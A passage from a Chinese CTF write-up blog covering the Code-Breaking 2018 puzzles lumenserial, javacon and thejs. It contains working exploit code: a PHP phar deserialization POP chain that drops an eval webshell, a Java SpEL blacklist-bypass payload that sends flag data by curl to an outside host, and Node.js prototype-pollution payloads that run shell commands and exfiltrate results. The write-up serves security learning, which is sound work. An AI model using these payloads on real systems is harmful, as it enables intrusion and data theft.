class="line"><span class="comment"># exp func call</span></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">function</span> = "<span class="title">file_put_contents</span>";</span><br><span class="line">    $parameters = [<span class="string">"/var/www/html/upload/z.php"</span>, base64_decode(<span class="string">"PD9waHAgZXZhbCgkX0dFVFsnMTEnXSk7Pz4="</span>)];</span><br><span class="line">    </span><br><span class="line">    $exp_call_obj = <span class="keyword">new</span> PHPUnit\Framework\MockObject\Stub\ReturnCallback($function);</span><br><span class="line"></span><br><span class="line">    $exp_args_obj = <span class="keyword">new</span> PHPUnit\Framework\MockObject\Invocation\StaticInvocation($parameters);</span><br><span class="line">    $tmp_arr = [<span class="string">"gogogo"</span> =&gt; $exp_args_obj];</span><br><span class="line">    $s4_obj = <span class="keyword">new</span> Faker\Generator($tmp_arr);</span><br><span class="line">    <span class="comment">// 第一次使用Generator来得到dispatch对应的内容</span></span><br><span class="line">    $get_func_arr = <span class="keyword">array</span>(<span class="string">"dispatch"</span>=&gt; <span class="keyword">array</span>($s4_obj, <span class="string">"getFormatter"</span>));</span><br><span class="line">    <span class="comment">// 最终将会返回 array($s4_obj, "getFormatter")</span></span><br><span class="line">    $s3_obj = <span class="keyword">new</span> Faker\Generator($get_func_arr);</span><br><span class="line">    <span class="comment">// array($s4_obj, "getFormatter") 进入format()中的call_user_func_array</span></span><br><span class="line">    <span class="comment">// 就可以返回我们gogogo所对应的$exp_args_obj</span></span><br><span class="line">    <span class="comment">// 最终我们需要的$exp_args_obj将会返回给$res</span></span><br><span class="line">    <span class="comment">// 之后$res再invoke()中可以通过$invocation-&gt;getParameters()将$parameters取出</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// $s3_obj对应generator是我们需要控制的类，而这个类中有我们用来控制$res变量的函数</span></span><br><span class="line">    <span class="comment">// array($exp_call_obj,"invoke")会在ValidGenerator中的call_user_func处调用invoke函数</span></span><br><span class="line">    $s2_obj = <span class="keyword">new</span> Faker\ValidGenerator($s3_obj, <span class="keyword">array</span>($exp_call_obj,<span class="string">"invoke"</span>), <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    $s1_obj = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($s2_obj, <span class="string">"gogogo"</span>);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($s1_obj)).<span class="string">"\n\r\n\r"</span>;</span><br><span class="line">    </span><br><span class="line">    $p = <span class="keyword">new</span> Phar(<span class="string">'./z.phar'</span>, <span class="number">0</span>);</span><br><span class="line">    $p-&gt;startBuffering();</span><br><span class="line">    $p-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">    $p-&gt;setMetadata($s1_obj);</span><br><span class="line">    $p-&gt;addFromString(<span class="string">'1.txt'</span>,<span class="string">'text'</span>);</span><br><span class="line">    $p-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h4><p>在此大致做个小结：</p>
<ol>
<li>首先，此处禁用了用于执行系统命令的函数，所以不能rce只能想办法getshell，写shell就要用<code>file_put_contents</code>函数，此时就涉及两个参数，所以就必须找<code>call_user_func_array</code>这样的函数来进行调用。</li>
<li>pop chain的构造对于框架而言是找到一个好的起始点，一般而言是找<code>__wakeup</code>和<code>__destruct</code>，但是框架的起始点和构造思想可以参考phpggc。对与laravel框架而言，就是看使用<code>dispatch</code>还是使用<code>__call</code>(选择的依据就是这两者中会不会涉及到<code>call_user_func_array</code>)。</li>
</ol>
<h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>在做此题目的时候之所以会想到是反序列漏洞是看如下信息:</p>
<ol>
<li><p>首先看框架的路由</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$router-&gt;get(<span class="string">'/server/editor'</span>, <span class="string">'EditorController@main'</span>);</span><br><span class="line">$router-&gt;post(<span class="string">'/server/editor'</span>, <span class="string">'EditorController@main'</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>其次根据路由看<code>Controller</code>，并在<code>Controller</code>中寻找敏感点，比如此处的<code>download</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    $content = file_get_contents($url);</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看url参数是否可控，是否过滤，那么就查看一下这个函数的调用点</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">doCatchimage</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $sources = $request-&gt;input(<span class="keyword">$this</span>-&gt;config[<span class="string">'catcherFieldName'</span>]);</span><br><span class="line">    $rets = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($sources) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($sources <span class="keyword">as</span> $url) &#123;</span><br><span class="line">            $rets[] = <span class="keyword">$this</span>-&gt;download($url);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>继续跟进<code>config[&#39;catcherFieldName&#39;]</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;catcherFieldName&quot;: &quot;source&quot;, /* 提交的图片列表表单名称 */</span><br></pre></td></tr></table></figure>
</li>
<li><p>可以看到路径上无过滤，因此参数可控，可以在这个点使用phar来getshell，进而就有了上面的pop chain构造</p>
</li>
<li>getshell<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/server/editor?action=Catchimage&amp;source[]=phar:///var/www/html/upload/image/78ed78f65afaa8137864b4839f2076a8/201904/14/9a032ef2cab676e1f622.gif</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p><img src="https://i.loli.net/2020/06/04/8FTaxUZ2pXgVstD.png" alt="539A5C5E-7729-494B-AD76-2BF98165A8D9.png"></p>
<p><img src="https://i.loli.net/2020/06/04/2v1Q5BEhLMrf7Wy.png" alt="51E3D681-D424-4298-B85A-5398B9B0684F.png"></p>
<p>其它pop chain参考 <a href="http://m4p1e.com/web/20181224.html" target="_blank" rel="noopener">《lumenserial–evil》</a></p>
<h2 id="0x07-javacon"><a href="#0x07-javacon" class="headerlink" title="0x07 javacon"></a>0x07 javacon</h2><h3 id="1-环境配置-1"><a href="#1-环境配置-1" class="headerlink" title="1. 环境配置"></a>1. 环境配置</h3><p>使用idea打开这个项目，之后右键jar包选择Add as Library，之后就可以分析其中的源代码了。</p>
<p><img src="https://i.loli.net/2020/06/04/RWBNjZwgYerDVUv.png" alt="5FC1A049-960A-4451-90BA-F4557B18B826.png"></p>
<p>配置进行远程调试<br><img src="https://i.loli.net/2020/06/04/do6mDh1Qrb4ZkON.png" alt="9EDB41F3-F006-4004-8FD6-B8B8208658C1.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005</span><br></pre></td></tr></table></figure>
<p>命令启动<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Xdebug -Xrunjdwp:transport=dt_socket,address=5005,server=y,<span class="built_in">suspend</span>=y -jar challenge-0.0.1-SNAPSHOT.jar</span><br></pre></td></tr></table></figure></p>
<p>之后点击DEBUG开始调试</p>
<h3 id="2-漏洞相关知识点"><a href="#2-漏洞相关知识点" class="headerlink" title="2. 漏洞相关知识点"></a>2. 漏洞相关知识点</h3><h4 id="2-1-EL表达式"><a href="#2-1-EL表达式" class="headerlink" title="2.1 EL表达式"></a>2.1 EL表达式</h4><h4 id="2-2-SpEL表达式注入"><a href="#2-2-SpEL表达式注入" class="headerlink" title="2.2 SpEL表达式注入"></a>2.2 SpEL表达式注入</h4><p>参考：<a href="http://rui0.cn/archives/1043" target="_blank" rel="noopener">《由浅入深SpEL表达式注入漏洞》</a></p>
<h4 id="2-3-反射"><a href="#2-3-反射" class="headerlink" title="2.3 反射"></a>2.3 反射</h4><p>参考：<a href="http://rui0.cn/archives/1112" target="_blank" rel="noopener">《深入理解Java反射中的invoke方法》</a></p>
<h3 id="3-漏洞调试分析"><a href="#3-漏洞调试分析" class="headerlink" title="3. 漏洞调试分析"></a>3. 漏洞调试分析</h3><p>可以看出是基于Spring框架编写的代码，所以首先查看其配置文件application.yml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">spring:</span><br><span class="line">  thymeleaf:</span><br><span class="line">    encoding: UTF-8</span><br><span class="line">    cache: false</span><br><span class="line">    mode: HTML</span><br><span class="line">keywords:</span><br><span class="line">  blacklist:</span><br><span class="line">    - java.+lang</span><br><span class="line">    - Runtime</span><br><span class="line">    - exec.*\(</span><br><span class="line">user:</span><br><span class="line">  username: admin</span><br><span class="line">  password: admin</span><br><span class="line">  rememberMeKey: c0dehack1nghere1</span><br></pre></td></tr></table></figure>
<p>可以看到用户的配置文件中写了一个黑名单和一个用户信息</p>
<blockquote>
<p>SmallEvaluationContext 继承 StandardEvaluationContext，主要是提供一个上下文环境，相当于一个容器。<br>ChallengeApplication 用于启动<br>Encryptor 加密解密工具类<br>KeyworkProperties 使用黑名单时需要<br>UserConfig 用户模型，可以看到在RemberMe时使用了Encryptor<br>引用自：<a href="http://rui0.cn/archives/1015" target="_blank" rel="noopener">http://rui0.cn/archives/1015</a></p>
</blockquote>
<p>主要从MainController开始看其功能实现</p>
<p><img src="https://i.loli.net/2020/06/04/1cQKxe8DtFWPngT.png" alt="截屏2019-10-15下午10.09.05.png"></p>
<p>此处的了漏洞主要是SpEL表达式问题，但是因为有黑名单的限制，所以需要利用反射来拼接payload达到绕过的目的。</p>
<p>常规rce方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)</span><br></pre></td></tr></table></figure></p>
<p>利用反射拼接的方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;exec&quot;,String.class).invoke(String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),&quot;curl http://i.zeye.xyz/test&quot;);</span><br></pre></td></tr></table></figure></p>
<p>PS: 一个坑点，在JAVA中Runtime中exec对复杂一点的linux命令执行不了…我们需要将其参数改成如下才可以</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new String[]&#123;&quot;/bin/bash\&quot;,&quot;-c&quot;,&quot;xxxxx&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>之后构造的payload如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(Encryptor.encrypt(&quot;c0dehack1nghere1&quot;, &quot;0123456789abcdef&quot;, &quot;#&#123;T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;ex\&quot;+\&quot;ec\&quot;,T(String[])).invoke(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;getRu\&quot;+\&quot;ntime\&quot;).invoke(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;)),new String[]&#123;\&quot;/bin/bash\&quot;,\&quot;-c\&quot;,\&quot;curl http://i.zeye.xyz/`cd / &amp;&amp; ls|base64|tr &apos;\\n&apos; &apos;-&apos;`\&quot;&#125;)&#125;&quot;));</span><br></pre></td></tr></table></figure></p>
<p>最终利用payload如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;curl http://i.zeye.xyz/`cat flag_j4v4_chun|base64|tr &apos;\n&apos; &apos;-&apos;`&quot;&#125;)&#125;</span><br></pre></td></tr></table></figure></p>
<p>参考：<a href="http://rui0.cn/archives/1015" target="_blank" rel="noopener">《Code-Breaking Puzzles — javacon WriteUp》</a></p>
<h2 id="0x08-thejs"><a href="#0x08-thejs" class="headerlink" title="0x08 thejs"></a>0x08 thejs</h2><h3 id="1-漏洞相关知识点"><a href="#1-漏洞相关知识点" class="headerlink" title="1. 漏洞相关知识点"></a>1. 漏洞相关知识点</h3><p>原型链污染，因为JavaScript是使用原型链机制来实现继承的，因此就可能会在<strong>能够控制数组（对象）的“键名”的操作</strong>处存在可污染点。</p>
<p>详细分析参考：<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">《深入理解 JavaScript Prototype 污染攻击》</a></p>
<h3 id="2-题目解答"><a href="#2-题目解答" class="headerlink" title="2. 题目解答"></a>2. 题目解答</h3><p>如果想要修改父对象的原型，有如下两种方式</p>
<ol>
<li><code>inst.constructor.prototype</code> </li>
<li><code>inst.__proto__</code><br>那么推广一下的话，又有如下两种方式</li>
<li><code>inst[constructor][prototype][]</code></li>
<li><code>inst[__proto__][]</code><br>所以也就是说只要找对数组进行操作的地方，我们就有可能完成对原型的污染。但是还要注意的是想办法赋值的<code>__proto__</code>对象并不是真正的这个对象，所以想要写到真正的<code>__proto__</code>中，我们需要一层赋值。</li>
</ol>
<p>所以接下来构造攻击链的思路是: 找到一个未定义的变量，但是这个变量要在后面被调用。</p>
<p>经过分析发现<code>sourceURL</code>是未定义的。</p>
<p><img src="https://i.loli.net/2020/06/04/TJKoxFlDg6CupI5.png" alt="971DD02B-9513-4415-B169-D86B9863C087.png"></p>
<p>程序中只有一个输入点也就是<code>req.body</code>，之后经过<code>lodash.merge</code>将两个对象进行合并<br><img src="https://i.loli.net/2020/06/04/i9dxGr36fVF8ktJ.png" alt="屏幕快照 2019-09-05 上午10.53.41.png"></p>
<p>后面可以看到<code>sourceURL</code>在判断中被调用<br><img src="https://i.loli.net/2020/06/04/cG57yEqtanx9bV3.png" alt="A6DD32B7-C1A1-45E2-BF7F-F2526CA3956E.png"></p>
<p>因而成功造成原型链污染，之后在模板渲染中的<code>Function</code>函数中将造成任意代码执行，我们可以在控制台中简单测试一下</p>
<p><img src="https://pic.downk.cc/item/5ed863e9c2a9a83be5b390ba.png" alt></p>
<p>一般来说，nodejs中可以直接通过require导入包来达到rce的效果，如下所示</p>
<p><img src="https://pic.downk.cc/item/5ed8640ac2a9a83be5b3b4e6.png" alt></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">global.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()</span><br></pre></td></tr></table></figure>
<p>但是此题环境中有沙箱对此进行了限制，因此如下payload是无法成功的。需要对沙箱环境进行bypass<br>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot; : &#123;&quot;sourceURL&quot; : &quot;\r\nreturn e = () =&gt; &#123;for (var a in &#123;&#125;)&#123;delete Object.prototype[a];&#125;return global.require(&apos;child_process&apos;).execSync(&apos;whoami&apos;).toString()&#125;\r\n&quot;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>效果<br><img src="https://pic.downk.cc/item/5ed86424c2a9a83be5b3d1d4.png" alt></p>
<p>bypass的payload可以参考这篇文章</p>
<p><a href="https://xz.aliyun.com/t/4361" target="_blank" rel="noopener">https://xz.aliyun.com/t/4361</a></p>
<p>最终构造两个payload如下所示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot; : &#123;&quot;sourceURL&quot; : &quot;\r\nreturn e = () =&gt; &#123;for (var a in &#123;&#125;)&#123;delete Object.prototype[a];&#125;return global.process.mainModule.constructor._load(&apos;child_process&apos;).execSync(&apos;ls&apos;).toString()&#125;\r\n&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;xxx\r\nvar require = global.require || global.process.mainModule.constructor._load;var result = require(&apos;child_process&apos;).execSync(&apos;cat /flag_thepr0t0js&apos;).toString();var req = require(&apos;http&apos;).request(`http://xxxx.ceye.io/$&#123;result&#125;`);req.end();\r\n&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>此处还有一个小细节，就是原型链污染之后，除非重启环境，否则攻击效果一直都在，也就是你读取的flag将一直显示在网页上，所以必须在污染之后将变量恢复，省的泄露我们的flag。（这也就是上面for循环进行delete的原因）</p>
<p><img src="https://pic.downk.cc/item/5ed86439c2a9a83be5b3e7ba.png" alt></p>
<h3 id="3-参考"><a href="#3-参考" class="headerlink" title="3. 参考"></a>3. 参考</h3><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">《深入理解 JavaScript Prototype 污染攻击》</a></p>
<p><a href="https://lorexxar.cn/2018/12/07/codingbreak-wp/#hard-thejs" target="_blank" rel="noopener">《Code Breaking挑战赛 Writeup》</a></p>
<p><a href="http://adm1n.design/2019/05/07/proto2/" target="_blank" rel="noopener">《JavaScript Prototype 污染攻击 之 Code-Breaking-TheJS篇》</a></p>
<h2 id="0x09-picklecode"><a href="#0x09-picklecode" class="headerlink" title="0x09 picklecode"></a>0x09 picklecode</h2><p>害，这个先不写了，有时间再补吧</p>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>


    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/About/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="https://github.com/zer0yu">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00前言"><span class="toc-number">1.</span> <span class="toc-text">0x00前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-function"><span class="toc-number">2.</span> <span class="toc-text">0x01 function</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-解决正则问题"><span class="toc-number">2.1.</span> <span class="toc-text">1.解决正则问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-create-function-gt-rce"><span class="toc-number">2.2.</span> <span class="toc-text">2.create_function-&gt;rce</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-pcrewaf"><span class="toc-number">3.</span> <span class="toc-text">0x02 pcrewaf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-phpmagic"><span class="toc-number">4.</span> <span class="toc-text">0x03 phpmagic</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-SERVER-‘SERVER-NAME’"><span class="toc-number">4.1.</span> <span class="toc-text">1.$_SERVER[‘SERVER_NAME’]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-解决扩展名过滤问题"><span class="toc-number">4.2.</span> <span class="toc-text">2.解决扩展名过滤问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-解决htmlspecialchars过滤问题"><span class="toc-number">4.3.</span> <span class="toc-text">3.解决htmlspecialchars过滤问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-寻找可控变量构造payload"><span class="toc-number">4.4.</span> <span class="toc-text">4.寻找可控变量构造payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-phplimit"><span class="toc-number">5.</span> <span class="toc-text">0x04 phplimit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-session-id"><span class="toc-number">5.1.</span> <span class="toc-text">1.session_id</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-get-defined-vars"><span class="toc-number">5.2.</span> <span class="toc-text">2.get_defined_vars</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-getcwd"><span class="toc-number">5.3.</span> <span class="toc-text">3. getcwd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-getallheaders"><span class="toc-number">5.4.</span> <span class="toc-text">4.getallheaders</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-getenv"><span class="toc-number">5.5.</span> <span class="toc-text">5.getenv</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-nodechr"><span class="toc-number">6.</span> <span class="toc-text">0x05 nodechr</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-toUpperCase-和toLowerCase-特性"><span class="toc-number">6.1.</span> <span class="toc-text">1.toUpperCase()和toLowerCase()特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-unicode大小写转换问题"><span class="toc-number">6.2.</span> <span class="toc-text">2.unicode大小写转换问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-lumenserial"><span class="toc-number">7.</span> <span class="toc-text">0x06 lumenserial</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-环境配置"><span class="toc-number">7.1.</span> <span class="toc-text">1. 环境配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-phpggc"><span class="toc-number">7.2.</span> <span class="toc-text">2. phpggc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#第一种"><span class="toc-number">7.2.1.</span> <span class="toc-text">第一种</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第二种"><span class="toc-number">7.2.2.</span> <span class="toc-text">第二种</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第三种"><span class="toc-number">7.2.3.</span> <span class="toc-text">第三种</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第四种"><span class="toc-number">7.2.4.</span> <span class="toc-text">第四种</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#小结"><span class="toc-number">7.2.5.</span> <span class="toc-text">小结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-POP-chain的构造"><span class="toc-number">7.3.</span> <span class="toc-text">3. POP chain的构造</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#chain-1"><span class="toc-number">7.3.1.</span> <span class="toc-text">chain 1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#chain-2"><span class="toc-number">7.3.2.</span> <span class="toc-text">chain 2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#小结-1"><span class="toc-number">7.3.3.</span> <span class="toc-text">小结</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#补充"><span class="toc-number">7.3.4.</span> <span class="toc-text">补充</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-javacon"><span class="toc-number">8.</span> <span class="toc-text">0x07 javacon</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-环境配置-1"><span class="toc-number">8.1.</span> <span class="toc-text">1. 环境配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-漏洞相关知识点"><span class="toc-number">8.2.</span> <span class="toc-text">2. 漏洞相关知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-EL表达式"><span class="toc-number">8.2.1.</span> <span class="toc-text">2.1 EL表达式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-SpEL表达式注入"><span class="toc-number">8.2.2.</span> <span class="toc-text">2.2 SpEL表达式注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-反射"><span class="toc-number">8.2.3.</span> <span class="toc-text">2.3 反射</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-漏洞调试分析"><span class="toc-number">8.3.</span> <span class="toc-text">3. 漏洞调试分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-thejs"><span class="toc-number">9.</span> <span class="toc-text">0x08 thejs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-漏洞相关知识点"><span class="toc-number">9.1.</span> <span class="toc-text">1. 漏洞相关知识点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-题目解答"><span class="toc-number">9.2.</span> <span class="toc-text">2. 题目解答</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-参考"><span class="toc-number">9.3.</span> <span class="toc-text">3. 参考</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-picklecode"><span class="toc-number">10.</span> <span class="toc-text">0x09 picklecode</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zer0yu.github.io/2020/06/04/Code-breaking-Puzzles-2018-Note/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://zer0yu.github.io/2020/06/04/Code-breaking-Puzzles-2018-Note/&text=Code-breaking Puzzles 2018 Note"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zer0yu.github.io/2020/06/04/Code-breaking-Puzzles-2018-Note/&title=Code-breaking Puzzles 2018 Note"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zer0yu.github.io/2020/06/04/Code-breaking-Puzzles-2018-Note/&is_video=false&description=Code-breaking Puzzles 2018 Note"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Code-breaking Puzzles 2018 Note&body=Check out this article: http://zer0yu.github.io/2020/06/04/Code-breaking-Puzzles-2018-Note/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://zer0yu.github.io/2020/06/04/Code-breaking-Puzzles-2018-Note/&title=Code-breaking Puzzles 2018 Note"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://zer0yu.github.io/2020/06/04/Code-breaking-Puzzles-2018-Note/&title=Code-breaking Puzzles 2018 Note"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zer0yu.github.io/2020/06/04/Code-breaking-Puzzles-2018-Note/&title=Code-breaking Puzzles 2018 Note"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://zer0yu.github.io/2020/06/04/Code-breaking-Puzzles-2018-Note/&title=Code-breaking Puzzles 2018 Note"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zer0yu.github.io/2020/06/04/Code-breaking-Puzzles-2018-Note/&name=Code-breaking Puzzles 2018 Note&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
